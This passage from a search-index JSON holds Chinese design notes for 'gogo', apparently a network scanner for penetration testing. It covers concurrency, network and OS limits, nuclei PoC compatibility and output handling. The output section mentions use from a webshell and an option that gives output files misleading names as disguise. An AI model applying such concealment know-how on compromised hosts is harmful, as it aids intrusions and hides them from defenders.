<p>\u5b9e\u73b0\u8fd9\u6837\u7684\u5de5\u5177\u5e76\u4e0d\u662f\u5b9e\u73b0\u529f\u80fd\u5373\u53ef, \u9700\u8981\u5927\u91cf\u65f6\u95f4\u4e0e\u7ecf\u9a8c\u6253\u78e8\u5176\u7ec6\u8282</p>"},{"location":"gogo/design/#\u5feb","title":"\u5feb","text":"<p>\u5728\u5bf9\u4e00\u4e9b\u5e38\u89c1\u7684\u626b\u63cf\u5668\u8c03\u7814\u4e4b\u540e\u4ee5\u53ca\u5bf9\u7f16\u7a0b, \u7f51\u7edc\u7684\u539f\u7406\u5b66\u4e60\u4e4b\u540e, \u80fd\u76f4\u5230\u5e76\u53d1\u626b\u63cf\u5e76\u975e\u662f\u7ebf\u7a0b\u6570\u8d8a\u9ad8\u8d8a\u597d\u3002\u8981\u8fbe\u5230\u5feb\u8fd8\u6709\u5f88\u591a\u9650\u5236\u6761\u4ef6\u4ee5\u53ca\u5bf9\u5e94\u7684\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"gogo/design/#\u5e76\u53d1","title":"\u5e76\u53d1","text":"<p>\u63d0\u9ad8\u7ebf\u7a0b\u6570\u662f\u6700\u5e38\u89c1\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u4f8b\u5982\u65e9\u671f\u7684\u626b\u63cf\u5668\u591a\u4e3a\u5355\u7ebf\u7a0b\u6216\u8005\u4f7f\u752810\u523020\u4e2a\u7ebf\u7a0b\uff0c\u4f8b\u5982\u5fa1\u5251\u548c\u4e00\u4e9b\u4f7f\u7528Python\u5f00\u53d1\u7684\u7b80\u5355\u626b\u63cf\u5668\u3002\u5c3d\u7ba1\u5b83\u4eec\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u4f46\u5bf9\u9ad8\u7ebf\u7a0b\u6570\u7684\u652f\u6301\u4e0d\u4f73\u3002\u539f\u56e0\u53ef\u80fd\u662f\u5f53\u65f6\u534f\u7a0b\u7684\u6982\u5ff5\u8fd8\u6ca1\u6709\u88ab\u5e7f\u6cdb\u5e94\u7528\uff0c\u6216\u8005\u662f\u751f\u6001\u4e2d\u6ca1\u6709\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848\u3002\u4f7f\u7528\u7cfb\u7edf\u7684\u591a\u7ebf\u7a0bAPI\u4f1a\u5e26\u6765\u8bb8\u591a\u989d\u5916\u7684\u6027\u80fd\u6d88\u8017\uff0c\u5982\u5728\u5185\u6838\u5c42\u548c\u7528\u6237\u5c42\u4e4b\u95f4\u5207\u6362\u3001\u4e0d\u65ad\u8fd8\u539f\u548c\u4fdd\u5b58\u7ebf\u7a0b\u5806\u6808\u3001\u4f7f\u7528\u5404\u79cd\u9501\u5bfc\u81f4\u7684\u6027\u80fd\u635f\u8017\u7b49\u7b49\u3002</p> <ol> <li>\u9700\u8981\u5728\u5185\u6838\u5c42\u4e0e\u7528\u6237\u5c42\u4e0d\u65ad\u5207\u6362</li> <li>\u4e0d\u65ad\u8fd8\u539f\u4e0e\u4fdd\u5b58\u9ad8\u8fbe4M\u7684\u7ebf\u7a0b\u5806\u6808</li> <li>\u4e3a\u4e86\u7ebf\u7a0b\u5b89\u5168\u4f7f\u7528\u7684\u5404\u79cd\u9501\u5e26\u6765\u7684\u8017\u65f6 ...</li> </ol> <p>\u4ee5\u53ca\u4e00\u4e9b\u6211\u5c1a\u4e0d\u77e5\u9053\u7684\u6027\u80fd\u6d88\u8017, \u5bfc\u81f4\u591a\u7ebf\u7a0b\u7684\u5e94\u7528\u5f88\u96be\u8fdb\u884c\u6570\u767e\u751a\u81f3\u6570\u5343\u7ebf\u7a0b\u7684\u5e76\u53d1\u3002</p> <p>\u57282021\u5e74\u7684\u4eca\u5929, Go\u63d0\u4f9b\u4e86\u7b80\u5355\u53ef\u9760\u65b9\u4fbf\u7684\u9ad8\u5e76\u53d1\u89e3\u51b3\u65b9\u6848, \u53ef\u4ee5\u57281C1G\u7684\u4f4e\u914dVPS\u4e0a\u5b9e\u73b0\u6570\u5343\u4e2agoroutine\u7684\u8c03\u5ea6\u3002\u53ea\u9700\u8981\u4f7f\u7528Go\u5173\u952e\u5b57, \u5c31\u80fd\u968f\u610f\u7684\u5b9e\u73b0\u6570\u5343\u4e2a\u534f\u7a0b\u7684\u5e76\u53d1, \u534f\u7a0b\u7684\u8c03\u5ea6\u5c06\u7531go\u8fdb\u884c, \u4e0d\u518d\u9700\u8981\u7cfb\u7edf\u8c03\u5ea6\u7684\u5927\u91cf\u65e0\u7528\u6d88\u8017\u3002</p> <p>\u5f53\u7136, go\u7684\u534f\u7a0b\u7ec8\u5f52\u8fd8\u662f\u6709\u6808\u534f\u7a0b, \u5e76\u4e14\u534f\u7a0b\u8c03\u5ea6\u4e5f\u4e0d\u662f\u65e0\u635f, \u4e3a\u4e86\u51cf\u5c11\u8fd9\u4e2a\u6d88\u8017, \u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u590d\u7528\u534f\u7a0b\u6c60\u7684\u65b9\u5f0f\u5c3d\u53ef\u80fd\u5730\u51cf\u5c11\u6d88\u8017.</p>"},{"location":"gogo/design/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"<p>TCP\u62e5\u585e\u63a7\u5236</p> <p>\u90fd\u5b66\u8fc7TCP\u62e5\u585e\u63a7\u5236\u4f46\u662f\u8fd9\u4e2a\u62e5\u585e\u63a7\u5236\u662f\u9488\u5bf9\u6bcf\u4e00\u6761TCP\u4fe1\u9053\u81ea\u8eab\u7684, \u4e0d\u4f1a\u5f71\u54cd\u5230\u5176\u4ed6TCP\u4fe1\u9053.\u56e0\u6b64\u53ea\u6709\u5728\u4f20\u8f93\u5927\u6570\u636e\u7684\u65f6\u5019, \u624d\u4f1a\u6709\u6027\u80fd\u5f71\u54cd.\u5bf9\u4e8e\u7aef\u53e3\u626b\u63cf\u8fd9\u6837\u7684\u573a\u666f, \u6bcf\u6761TCP\u4fe1\u9053\u5e76\u4e0d\u4f1a\u6709\u975e\u5e38\u591a\u7684\u6570\u636e\u4ea4\u4e92, \u56e0\u6b64\u4e0d\u53d7TCP\u62e5\u585e\u63a7\u5236\u5f71\u54cd.\u4f46\u662f\u7f51\u7edc\u62e5\u585e\u4f1a\u786e\u786e\u5b9e\u5b9e\u7684\u5f71\u54cd\u5230\u626b\u63cf\u51c6\u786e\u7387.\u8fd9\u662f\u56e0\u4e3a\u521a\u624d\u63d0\u5230\u7684\u8def\u7531\u5668\u7684\u95ee\u9898, \u5728\u8def\u7531\u7684\u8fc7\u7a0b\u4e2d, \u7f51\u7edc\u62e5\u585e\u6bcf\u4e2aTTL\u7684\u65f6\u95f4\u5c31\u4f1a\u589e\u52a0.</p> <p>\u6240\u4ee5\u5224\u65ad\u7f51\u7edc\u662f\u5426\u62e5\u585e, \u53ef\u4ee5\u5224\u65adTTL\u8017\u65f6\u7684\u53d8\u5316.</p> <p>\u8def\u7531\u5668\u7684Tail drop</p> <p>\u5728\u6d4b\u8bd5\u626b\u63cf\u7684\u8fc7\u7a0b\u4e2d, \u6709\u51e0\u6b21\u628a\u5bb6\u91cc\u7684\u534e\u4e3a\u8def\u7531\u5668\u6253\u6302\u76f4\u63a5\u91cd\u542f\u4e86.</p> <p>\u540e\u6765\u624d\u77e5\u9053, \u626b\u63cf\u7684\u9650\u5236\u53ef\u80fd\u4e0d\u6765\u81ea\u4ee3\u7801, \u4e5f\u4e0d\u6765\u81ea\u7cfb\u7edf, \u800c\u662f\u8def\u7531\u5668.\u5982\u679c\u8def\u7531\u5668\u7f51\u7edc\u62e5\u585e\u4e86, \u4f1a\u91c7\u7528Taildrop(\u5f53\u7f51\u7edc\u8bbe\u5907\u7684\u7f13\u51b2\u533a\u5df2\u6ee1\u65f6, \u65b0\u5230\u8fbe\u7684\u6570\u636e\u5305\u4f1a\u88ab\u4e22\u5f03)\u6765\u544a\u8bc9\u5ba2\u6237\u7aef\u7684TCP\u62e5\u585e\u4e86, \u542f\u7528\u62e5\u585e\u63a7\u5236, \u6162\u70b9\u53d1\u5305.\u800c\u5982\u679c\u8d1f\u8f7d\u518d\u5927\u4e00\u70b9, \u8def\u7531\u5668\u53ef\u80fd\u4f1a\u76f4\u63a5\u91cd\u542f.\u91cd\u542f\u8fd9\u79cd\u95ee\u9898\u4e3b\u8981\u53d1\u751f\u5728\u5bb6\u7528\u8def\u7531\u5668\u4e0a, \u4f01\u4e1a\u7ea7\u8def\u7531\u5668\u9762\u5bf9\u51e0\u5343\u7684\u5e76\u53d1\u8fd8\u662f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u7684.</p> <p>TCP keep-alive</p> <p>http1.1\u4e2d, \u5b9e\u73b0\u4e86keep-alive, \u4e0d\u518d\u9700\u8981\u6bcf\u6b21http\u91cd\u5199\u5efa\u7acb\u4e00\u6b21\u63e1\u624b, \u6d6a\u8d39\u5927\u91cf\u8d44\u6e90.</p> <p>\u56e0\u6b64\u5728http\u7aef\u53e3\u626b\u63cf, \u6307\u7eb9\u8bc6\u522b, \u4ee5\u53ca\u6253poc\u7684\u8fc7\u7a0b\u4e2d, \u90fd\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2akeep-alive\u957f\u8fde\u63a5.</p> <p>\u4f46\u662f\u5bf9\u4e8eTCP\u7aef\u53e3, \u5219\u4e0d\u9002\u7528\u8fd9\u4e2akeep-alive, \u56e0\u4e3a\u67d0\u4e9b\u670d\u52a1, \u53ea\u6709\u7b2c\u4e00\u4e2a\u5305\u6b63\u786e\u4e86\u624d\u4f1a\u8fd4\u56de\u5bf9\u5e94\u7684\u4fe1\u606f, \u5426\u5219\u8981\u4e48server\u4e3b\u52a8\u65ad\u5f00\u8fde\u63a5, \u8981\u4e48\u4e0d\u518d\u8fd4\u56de\u4fe1\u606f.\u6240\u4ee5\u6bcf\u4e2aTCP\u7aef\u53e3\u626b\u63cf\u90fd\u5efa\u8bae\u91cd\u65b0\u5efa\u7acb\u8fde\u63a5.</p> <p>time-wait</p> <p>time-wait\u72b6\u6001\u4ee3\u8868\u7740TCP\u8fde\u63a5\u5df2\u7ecf\u5173\u95ed, \u4f46\u662ffd\u8fd8\u88ab\u5360\u7528, \u7b49\u5f85\u53ef\u80fd\u7684\u540e\u7eed\u6570\u636e\u5904\u7406, \u9632\u6b62\u6709\u5305\u8ff7\u5931\u5728\u7f51\u7edc\u4e2d\u88ab\u6c61\u67d3\u4e0b\u4e00\u4e2a\u4f7f\u7528\u8fd9\u4e2a\u7aef\u53e3\u7684fd.</p> <p>\u5982\u679c\u4e0d\u80fd\u6b63\u786e\u7684\u5904\u7406\u8fd9\u4e2a\u95ee\u9898, \u53ef\u80fd\u5bfc\u81f4fd\u4e0e\u7aef\u53e3\u8d44\u6e90\u8017\u5c3d.</p>"},{"location":"gogo/design/#\u7cfb\u7edf\u9650\u5236","title":"\u7cfb\u7edf\u9650\u5236","text":"<p>\u4e3a\u4e86\u5c3d\u53ef\u80fd\u4fdd\u8bc1\u517c\u5bb9\u6027, gogo\u9009\u62e9\u5c3d\u91cf\u4e0d\u4f9d\u8d56\u7b2c\u4e09\u65b9\u5e93\u3002\u76ee\u524d, gogo\u5df2\u7ecf\u5728Linux\u4f4e\u7248\u672c\u5185\u6838\uff08\u6700\u4f4e\u6d4b\u8bd5\u52302.x\uff09\u3001BSD\u3001\u5404\u79cd\u7248\u672c\u7684MIPS\u548cARM\u67b6\u6784\u4ee5\u53caWindows Server 2003\u7b49\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u8fdb\u884c\u4e86\u6d4b\u8bd5\u8fd0\u884c, \u8986\u76d6\u4e86\u7edd\u5927\u591a\u6570\u7684\u4f7f\u7528\u573a\u666f\u3002\u5c3d\u7ba1\u6709\u4e9b\u7cfb\u7edf\u6ca1\u6709\u88ab\u6d4b\u8bd5\u8fc7, \u4f46\u5b83\u4eec\u4e5f\u5f88\u6709\u53ef\u80fd\u517c\u5bb9gogo\u3002\u5982\u9700\u5728\u8fd9\u4e9b\u7cfb\u7edf\u4e0a\u4f7f\u7528, \u53ef\u4ee5\u624b\u52a8\u7f16\u8bd1gogo\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002</p> <p>go.sum\u4e2d\u53ef\u4ee5\u770b\u5230\u6709\u4e9b\u9012\u5f52\u7684\u4f9d\u8d56, \u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u8c03\u7528\u5230\u76f8\u5173\u51fd\u6570, \u56e0\u6b64\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8df3\u8fc7\u3002</p> <p>\u7cfb\u7edf\u7ebf\u7a0b\u8c03\u5ea6</p> <p>Windows\u7684\u7ebf\u7a0b\u8c03\u5ea6\u6027\u80fd\u663e\u7136\u4e0d\u5982Linux, \u4e0d\u53ea\u662f\u5e76\u53d1\u63a7\u5236, \u8fd8\u6709TCP\u5806\u6808\u4ee5\u53ca\u5176\u4ed6\u5404\u79cd\u5404\u6837\u7684\u6d88\u8017\u3002</p> <p>\u5728\u4f7f\u7528Windows\u8fdb\u884c\u626b\u63cf\u7684\u65f6\u5019, \u7ecf\u5e38\u51fa\u73b0\u5bfc\u81f4\u7f51\u7edc\u5d29\u6e83\u5e76\u4e14\u9700\u8981\u597d\u51e0\u5206\u949f\u624d\u80fd\u6062\u590d\u3001\u4ea7\u751f\u5927\u91cf\u7684\u6f0f\u62a5\u3001\u8bc6\u522b\u4e0d\u5230http\u534f\u8bae\u6216\u8005\u53ea\u80fd\u5efa\u7acbTCP\u63e1\u624b\u7b49\u7b49\u95ee\u9898\u3002</p> <p>\u5728Windows\u8fdb\u884c\u626b\u63cf\u9047\u5230\u4e86\u975e\u5e38\u591a\u7684\u95ee\u9898, \u6700\u7ec8\u53ea\u80fd\u964d\u4f4e\u7ebf\u7a0b\u6570\u59a5\u534fWindows\u3002</p> <p>\u6709\u4e0d\u5c11\u4eba\u53cd\u9988Mac\u4e0a\u4e5f\u5b58\u5728\u7c7b\u4f3c\u7684\u95ee\u9898, \u660e\u660e\u5185\u5b58\u4e0eCPU\u90fd\u6ca1\u6709\u4f7f\u7528, \u64cd\u4f5c\u7cfb\u7edf\u7f3a\u83ab\u540d\u5361\u987f\u751a\u81f3\u5d29\u6e83\u91cd\u542f. \u540c\u6837\u53ef\u80fd\u662f\u56e0\u4e3a\u5185\u6838\u7684\u5e76\u53d1\u8c03\u5ea6\u5bfc\u81f4\u7684. </p> <p>\u6700\u5927FD\u9650\u5236</p> <p>\u8001\u7248\u672c\u7684Linux\u9ed8\u8ba4\u7684FD\u9650\u5236\u4e3a1024, \u90e8\u5206\u65b0\u7248\u672c\u7684Linux\u53d1\u884c\u7248\u6539\u6210\u4e8665535, \u5982\u679c\u8981\u4fee\u6539FD\u9650\u5236, \u9700\u8981root\u6743\u9650\u6307\u5b9a<code>limits-n 65535</code>\u4fee\u6539.</p> <p>Windows\u4e2d\u4e5f\u6709\u7c7b\u4f3c\u7684\u9650\u5236, \u9ed8\u8ba4\u5927\u6982\u662f5000, \u9700\u8981\u901a\u8fc7\u6ce8\u518c\u8868\u4fee\u6539, \u4e0d\u5e78\u7684\u662fWindows\u5927\u90e8\u5206\u60c5\u51b5\u6839\u672c\u8dd1\u4e0d\u52304000\u7f51\u7edc\u5c31\u5d29\u6e83\u4e86\u3002</p> <p>65535\u6700\u5927\u7aef\u53e3\u6570\u9650\u5236</p> <p>\u6bcf\u4e2a\u7cfb\u7edf\u53ef\u7528\u7684\u7aef\u53e3\u90fd\u53ea\u670965535\u4e2a, \u800c\u5728http\u626b\u63cf\u7684\u65f6\u5019, \u90e8\u5206\u8bed\u8a00\u5b58\u5728\u7aef\u53e3\u5360\u7528\u95ee\u9898\u3002\u4f8b\u5982, go\u7684\u590d\u7528\u8fde\u63a5\u6c60\u4f1a\u9ed8\u8ba4\u542f\u7528keep-alive, \u5bfc\u81f4\u7aef\u53e3\u88ab\u957f\u65f6\u95f4\u5360\u7528\u3002\u7c7b\u4f3c\u7684\u95ee\u9898\u4e5f\u5b58\u5728\u4e8e\u5176\u4ed6\u4e00\u4e9b\u8bed\u8a00, \u6bd4\u5982C#\u3002</p> <p>\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u4ee5\u4e0a\u7684\u5751\u51e0\u4e4e\u90fd\u8e29\u8fc7, \u5e76\u82b1\u8d39\u4e86\u4e00\u4e9b\u65f6\u95f4\u53bb\u5bfb\u627e\u5408\u9002\u7684\u89e3\u51b3\u529e\u6cd5, \u5e76\u6700\u7ec8\u5c06\u5176\u6b66\u5668\u5316/\u81ea\u52a8\u5316\u79ef\u7d2f\u5728gogo\u4e4b\u4e2d\u3002</p>"},{"location":"gogo/design/#\u53ef\u63a7","title":"\u53ef\u63a7","text":"<p>gogo\u51e0\u4e4e\u5c06\u4e00\u4e2a\u9636\u6bb5\u7684\u903b\u8f91, \u6bcf\u4e2a\u7ec6\u8282\u7684\u63a7\u5236\u90fd\u5c01\u88c5\u6210\u4e86\u4e00\u4e2a\u4e00\u4e2a\u547d\u4ee4\u884c\u53c2\u6570, \u8fd9\u4e5f\u662fgogo\u5b58\u5728\u4e00\u5b9a\u5165\u95e8\u95e8\u69db\u7684\u539f\u56e0\u3002</p> <p>\u5f53\u7136, \u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b, \u7528\u4e0d\u5230\u8fd9\u4e9b\u590d\u6742\u7684\u53c2\u6570, \u4f46\u5728\u9700\u8981\u7684\u65f6\u5019, \u4f60\u4e00\u5b9a\u80fd\u4ecegogo\u4e2d\u627e\u5230\u89e3\u51b3\u529e\u6cd5\u3002\u540c\u65f6, gogo\u4e5f\u63d0\u4f9b\u4e86\u4fbf\u6377\u7684workflow, \u5c06\u4e00\u4e9b\u5e38\u7528\u7684\u53c2\u6570\u7ec4\u5408\u5c01\u88c5\u4e3a\u4e86workflow, \u4ec5\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u5373\u53ef\u8c03\u7528\u590d\u6742\u7684\u626b\u63cf\u903b\u8f91\u3002</p> <p>\u8fd9\u79cd\u4e00\u5207\u6d41\u7a0b\u4e0e\u7ec6\u8282\u53ef\u63a7\u7684\u8bbe\u8ba1, \u4e5f\u662f\u6211\u8ba4\u4e3a\u7684\u5de5\u4ef6\u5316\u6838\u5fc3\u3002\u5de5\u4ef6\u53ef\u4ee5\u8bbe\u8ba1\u7684\u5f88\u590d\u6742, \u56e0\u4e3a\u5728\u6211\u4eec\u7684\u5de5\u4f5c\u5b8c\u6210\u540e, \u53bb\u7ec4\u5408\u8fd9\u4e9b\u53c2\u6570\u7684\u5e76\u4e0d\u662f\u4eba, \u800c\u662f\u4e00\u4e2a\u81ea\u52a8\u5316/\u534a\u81ea\u52a8\u5316\u5f15\u64ce\u3002\u6211\u4eec\u65e2\u4e0d\u60f3\u628a\u6240\u6709\u7684\u4ee3\u7801\u90fd\u5199\u5230\u5f15\u64ce\u5185\u90e8, \u7406\u8bba\u4e0a\u4e5f\u4e0d\u80fd\u5b9e\u73b0\u8fd9\u4e00\u70b9, \u53c8\u9700\u8981\u8ba9\u5f15\u64ce\u5145\u5206\u53bb\u63a7\u5236\u6bcf\u4e2a\u7ec6\u8282\u3002\u90a3\u53ea\u80fd\u5728\u5de5\u4ef6\u7684\u8bbe\u8ba1\u4e0a\u4e0b\u6587\u7ae0.\u5c06\u4e00\u5207\u53ef\u80fd\u53d1\u751f\u7684\u60c5\u51b5\u90fd\u53d8\u6210\u4e00\u4e2a\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\u3002</p> <p>\u5982\u679c\u505a\u4e0d\u5230\u8fd9\u4e00\u70b9, \u5c31\u7b97\u5199\u51fa\u4e86\u4e00\u4e2a\u4e00\u628a\u68ad\u5de5\u5177, \u5b9e\u9645\u4e0a\u4e5f\u53ea\u662f\u6d6e\u4e8e\u8868\u9762\u7684\u597d\u7528, \u65e2\u65e0\u6cd5\u8fed\u4ee3, \u4e5f\u65e0\u6cd5\u5224\u65ad\u662f\u5426\u4e3a\u5de5\u5177\u5bfc\u81f4\u7684\u95ee\u9898\u3002\u56e0\u4e3a\u5de5\u5177\u4e00\u65e6\u4ea7\u751f\u6f0f\u62a5, \u5bf9\u4eba\u7c7b\u6765\u8bf4, \u8fd9\u4e2a\u4fe1\u606f\u662f\u4e0d\u5b58\u5728, \u800c\u975e\u9519\u8bef, \u65e0\u6cd5\u8fdb\u884cDebug\u3002</p> <p>\u800c\u5b9e\u73b0\u4e86\u53ef\u63a7\u7684\u5de5\u5177, \u6211\u4eec\u624d\u80fd\u5c06\u5176\u79f0\u4e4b\u4e3a\u5de5\u4ef6\u3002\u5b83\u53ea\u662f\u628a\u9524\u5b50, \u4f46\u80fd\u9524\u4e00\u5207\u6837\u5b50\u7684\u9489\u5b50\u3002</p>"},{"location":"gogo/design/#\u53ef\u62d3\u5c55","title":"\u53ef\u62d3\u5c55","text":"<p>\u4e3a\u4e86\u6ee1\u8db3\u53ef\u62d3\u5c55\u6027, xray\u91c7\u7528\u4e86\u5f3a\u4f9d\u8d56go-cel\u89e3\u91ca\u5668\u7f16\u5199poc, \u5bfc\u81f4poc\u5f88\u96be\u79fb\u690d, \u56e0\u6b64\u653e\u5f03\u4e86xray\u7684poc\u3002\u90e8\u5206python poc\u6846\u67b6, \u4f8b\u5982pocsuite\u5219\u662f\u76f4\u63a5\u91c7\u7528python\u7f16\u5199\u4ee3\u7801, \u66f4\u96be\u8fc1\u79fb\u5230\u5176\u4ed6\u5e73\u53f0\u3002goby\u63d0\u4f9b\u4e86\u4e00\u4e2a\u56fe\u5f62\u5316\u7684poc\u751f\u6210\u5de5\u5177, \u65b9\u4fbf\u4e86\u4e0d\u5c11, \u4e0d\u8fc7\u5e76\u4e0d\u5f00\u6e90\u3002</p> <p>\u56e0\u6b64\u6700\u7ec8poc\u4e0a\u9009\u62e9\u4e86\u517c\u5bb9nuclei, \u597d\u5728nuclei\u7684\u793e\u533a\u662f\u76ee\u524d\u6700\u6d3b\u8dc3\u7684\u6f0f\u6d1e\u5206\u4eab\u793e\u533a, \u56ca\u62ec\u4e86\u7edd\u5927\u90e8\u5206\u53ef\u80fd\u7528\u5f97\u5230\u7684\u6f0f\u6d1e\u3002</p> <p>gogo\u4e5f\u5728\u5c3d\u53ef\u80fd\u5728\u5176\u4ed6\u5730\u65b9\u8ffd\u6c42\u53ef\u62d3\u5c55\u6027\u3002\u76ee\u524d\u53ef\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u62d3\u5c55\u7684\u529f\u80fd\u6709\u5f88\u591a, \u53ef\u89c1\u62d3\u5c55\u7f16\u5199</p> <p>\u800c\u4e3a\u4e86\u5728\u5b9e\u6218\u4e2d\u5feb\u901f\u8fed\u4ee3\u5e76\u6295\u5165\u4f7f\u7528, gogo\u4ee5yaml\u914d\u7f6e\u4f5c\u4e3a\u4f4e\u4ee3\u7801\u89e3\u51b3\u65b9\u6848, gogo\u7edd\u5927\u90e8\u5206\u80fd\u529b\u90fd\u6765\u81eatemplates\u4ed3\u5e93\u4e2d\u5404\u79cd\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>gogo\u4ee5\u53bb\u4ee3\u7801\u5316\u62d3\u5c55\u7684\u89e3\u51b3\u65b9\u6848\u5b9e\u73b0\u5728\u5b9e\u6218\u4e2d\u5f00\u53d1, \u5728\u5b9e\u6218\u4e2d\u6210\u957f, \u5728\u5b9e\u6218\u4e2d\u8fed\u4ee3\u7684\u7406\u60f3\u76ee\u6807\u3002</p>"},{"location":"gogo/design/#\u53ef\u5904\u7406","title":"\u53ef\u5904\u7406","text":"<p>gogo\u4fdd\u5b58\u5230\u6587\u4ef6\u7684\u683c\u5f0f\u9ed8\u8ba4\u91c7\u7528\u4e86JSON\u7684\u683c\u5f0f\u5316\u4fdd\u5b58, \u5e76\u5728JSON\u4e0a\u505a\u4e86\u4e00\u5c42deflate\u538b\u7f29\u3002JSON\u539f\u672c\u5e76\u4e0d\u662f\u4e00\u4e2a\u5141\u8bb8\u6d41\u5f0f\u4f20\u8f93\u7684\u683c\u5f0f, \u6240\u4ee5gogo\u4e5f\u505a\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u4f18\u5316, \u4ee5\u505a\u5230\u7ed3\u679c\u7684\u5b9e\u65f6\u8f93\u51fa(\u6ee14k\u8f93\u51fa\u4e00\u6b21), \u5e76\u5b9e\u65f6\u67e5\u770b\u626b\u63cf\u8fdb\u5ea6(\u4efb\u52a1\u6ca1\u5b8c\u6210\u4e5f\u53ef\u4ee5-F, \u4f1a\u5c1d\u8bd5\u81ea\u52a8\u4fee\u590ddat)\u3002</p> <p>\u4e3a\u4e86\u5e94\u5bf9\u53ef\u80fd\u51fa\u73b0\u7684\u5404\u79cd\u5947\u602a\u7684\u573a\u666f, \u5728\u4f7f\u7528gogo\u65f6, \u53ef\u80fd\u9700\u8981\u6765\u56de\u591a\u6b21\u5bf9gogo\u7684\u626b\u63cf\u7ed3\u679c\u518d\u6b21\u626b\u63cf, \u6216\u8005\u5bfc\u5165\u5230\u5176\u4ed6\u5de5\u5177\u4e2d\u3002gogo\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f3a\u5927\u7684\u8f93\u51fa/\u8f93\u51fa\u903b\u8f91, \u53ef\u4ee5\u81ea\u7531\u7684\u63a7\u5236\u8f93\u5165\u4e0e\u8f93\u51fa\u7684\u683c\u5f0f, \u5e76\u5bfc\u51fa\u4e3a\u5408\u9002\u7684\u683c\u5f0f\u7ed9\u5176\u4ed6\u5de5\u5177\u6216\u8005\u8f85\u52a9\u4eba\u5de5\u8fdb\u884c\u6570\u636e\u7684\u4e8c\u6b21\u5206\u6790\u3002</p> <p>\u5c06gogo\u843d\u5730\u7684\u573a\u666f\u975e\u5e38\u591a, \u4e3a\u4e86\u5e94\u5bf9\u8fd9\u4e9b\u590d\u6742\u7684\u573a\u666f, gogo\u4e5f\u8bbe\u8ba1\u4e86\u4e00\u5957\u5e76\u4e0d\u7b80\u5355\u7684\u89e3\u51b3\u65b9\u6848, \u8f93\u5165\u4e0e\u8f93\u51fa\u90fd\u9700\u8981\u901a\u8fc7\u5927\u91cf\u53c2\u6570\u63a7\u5236\u5176\u7ed3\u679c\u3002</p> <p>\u4e0d\u8fc7\u4e00\u65e6\u719f\u6089\u4e86gogo\u7684\u8f93\u51fa\u4e0e\u8f93\u51fa\u63a7\u5236, \u80fd\u8282\u7701\u5f88\u591a\u6570\u636e\u6765\u56de\u4e0a\u4f20\u4e0b\u8f7d\u7684\u65f6\u95f4\u3002</p> <p>\u5927\u90e8\u5206\u60c5\u51b5\u4e0b, gogo\u90fd\u63a8\u8350\u4fdd\u5b58<code>.dat</code>\u6587\u4ef6.\u5728workflow\u4e2d\u4e5f\u90fd\u8bbe\u7f6e\u4e86\u81ea\u52a8\u4fdd\u5b58\u5230dat\u3002\u63a8\u8350\u8fd9\u4e48\u505a\u7684\u7406\u7531\u5982\u4e0b\uff1a</p> <ol> <li>\u9632\u6b62\u547d\u4ee4\u884c\u7a97\u53e3\u88ab\u5173\u6389, \u626b\u63cf\u8bb0\u5f55\u4e22\u5931</li> <li>Webshell\u573a\u666f\u4e0b\u4e0d\u4e00\u5b9a\u80fd\u62ff\u5230\u5b9e\u65f6\u7684\u8f93\u51fa</li> <li>\u4fdd\u5b58\u7684\u6587\u4ef6\u662f\u53ef\u4ee5\u88ab\u540e\u7eed\u7684\u626b\u63cf\u590d\u7528\u7684</li> <li>\u652f\u6301<code>--hf</code>\u751f\u6210\u5e26\u6709\u8ff7\u60d1\u6027\u8d28\u7684\u6587\u4ef6\u540d, \u5bf9\u4e8e\u4e0d\u719f\u6089\u8be5\u5de5\u5177\u7684\u4eba, \u8fd9\u6837\u7684\u4e8c\u8fdb\u5236\u5185\u5bb9\u5e76\u6709\u4f2a\u88c5\u6027\u8d28\u7684\u8f93\u51fa\u683c\u5f0f\u4e5f\u8bb8\u80fd\u8d77\u5230\u4e00\u4e9b\u4f2a\u88c5\u4f5c\u7528\u3002</li> </ol> <p>\u4e5f\u6b63\u662f\u8003\u8651\u5230gogo\u843d\u5730\u5230\u4e0d\u540c\u7684\u573a\u666f, \u505a\u51fa\u4e86\u4e00\u4e9b\u59a5\u534f, \u6bd4\u5982, \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8f93\u51fa\u65e0\u7740\u8272\u5668\u3001\u5b58\u5728<code>.sock.lock</code>\u5728\u65e0\u4ea4\u4e92\u5f0f\u7684\u60c5\u51b5\u4e0b\u786e\u8ba4\u8fdb\u5ea6\u3001\u9ed8\u8ba4\u8f93\u51fa\u6587\u4ef6\u662f\u901a\u8fc7deflate\u6d41\u5f0f\u538b\u7f29\u7684\u7b49\u7b49\u3002</p>"},{"location":"gogo/design/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"<p>\u9664\u4e86\u4e0a\u9762\u7684\u5f00\u53d1\u539f\u5219, gogo\u8fd8\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u8bbe\u8ba1\u4e0e\u4f18\u5316\u3002</p> <p>\u53bb\u4f9d\u8d56</p> <p>gogo\u901a\u8fc7\u51e0\u4e2a\u6708\u65f6\u95f4\u5c3d\u53ef\u80fd\u53bb\u6389\u4e86\u80fd\u53bb\u6389\u7684\u4f9d\u8d56\u3002</p> <p>\u8fd9\u662fgogo\u76ee\u524d\u6240\u6709\u7684\u4f9d\u8d56</p> 